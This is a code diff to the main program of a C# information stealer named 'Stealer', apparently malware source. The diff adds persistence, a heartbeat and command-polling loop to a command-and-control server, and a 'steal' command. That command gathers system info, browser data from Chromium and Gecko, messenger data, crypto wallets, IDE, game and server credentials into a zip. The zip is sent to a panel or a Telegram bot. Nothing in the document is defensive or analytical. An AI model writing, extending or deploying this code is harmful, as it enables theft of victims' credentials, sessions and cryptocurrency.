@@ -1,4 +1,5 @@
 using System;
+using System.Threading;
 using System.Threading.Tasks;
 using Stealer.Collectors;
 using Stealer.Utils;
@@ -7,77 +8,98 @@ namespace Stealer
 {
     class Program
     {
-        static async Task Main(string[] args)
+        private static readonly int HeartbeatInterval = 25000;
+        private static readonly int CommandPollInterval = 10000;
+        private static string _clientId;
+
+        static void Main(string[] args)
+        {
+            Config.Initialize();
+            _clientId = Environment.MachineName + "_" + Environment.UserName;
+
+            Persistence.Install();
+
+            var heartbeatThread = new Thread(HeartbeatLoop) { IsBackground = true };
+            heartbeatThread.Start();
+
+            CommandLoop();
+        }
+
+        private static void HeartbeatLoop()
+        {
+            while (true)
+            {
+                try
+                {
+                    C2Client.SendHeartbeat(_clientId).Wait();
+                }
+                catch { }
+                Thread.Sleep(HeartbeatInterval);
+            }
+        }
+
+        private static void CommandLoop()
+        {
+            while (true)
+            {
+                try
+                {
+                    var cmd = C2Client.PollCommand(_clientId).Result;
+                    if (!string.IsNullOrEmpty(cmd))
+                    {
+                        HandleCommand(cmd).Wait();
+                    }
+                }
+                catch { }
+                Thread.Sleep(CommandPollInterval);
+            }
+        }
+
+        private static async Task HandleCommand(string command)
+        {
+            switch (command.ToLower().Trim())
+            {
+                case "steal":
+                    await RunStealer();
+                    break;
+                case "uninstall":
+                    Persistence.Uninstall();
+                    Environment.Exit(0);
+                    break;
+            }
+        }
+
+        private static async Task RunStealer()
         {
             try
             {
                 using (var zip = new InMemoryZip())
                 {
-                    // Собираем системную информацию
                     SystemInfoCollector.Collect(zip);
-
-                    // Собираем браузеры
                     ChromiumCollector.Collect(zip);
-
                     GeckoCollector.Collect(zip);
-
-                    // Собираем мессенджеры
                     MessengersCollector.Collect(zip);
-
-                    // Собираем криптокошельки
                     CryptoCollector.Collect(zip);
-
-                    // Собираем IDE
                     IDECollector.Collect(zip);
-
-                    // Собираем игры
                     GamesCollector.Collect(zip);
-
-                    // Собираем серверы
                     ServersCollector.Collect(zip);
 
-                    // Проверяем что собрали
-                    if (zip.Count == 0)
-                    {
-                        Config.Initialize();
-                        if (!Config.Delivery.Equals("PANEL", StringComparison.OrdinalIgnoreCase))
-                        {
-                            await TelegramSender.SendMessageAsync("❌ Stealer: No data found");
-                        }
-                        return;
-                    }
+                    if (zip.Count == 0) return;
 
-                    // Создаём архив
                     byte[] zipData = zip.ToArray();
-
-                    // Отправляем по выбранному методу
-                    Config.Initialize();
                     string fileName = $"Stealer_{Environment.UserName}_{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.zip";
-                    bool success = false;
 
                     if (Config.Delivery.Equals("PANEL", StringComparison.OrdinalIgnoreCase))
                     {
-                        success = await PanelSender.SendZipAsync(zipData, fileName);
+                        await PanelSender.SendZipAsync(zipData, fileName);
                     }
                     else
                     {
-                        success = await TelegramSender.SendZipAsync(zipData, fileName);
+                        await TelegramSender.SendZipAsync(zipData, fileName);
                     }
                 }
             }
-            catch (Exception ex)
-            {
-                try
-                {
-                    Config.Initialize();
-                    if (!Config.Delivery.Equals("PANEL", StringComparison.OrdinalIgnoreCase))
-                    {
-                        await TelegramSender.SendMessageAsync($"❌ Stealer error: {ex.Message}");
-                    }
-                }
-                catch { }
-            }
-
+            catch { }
         }
     }
 }
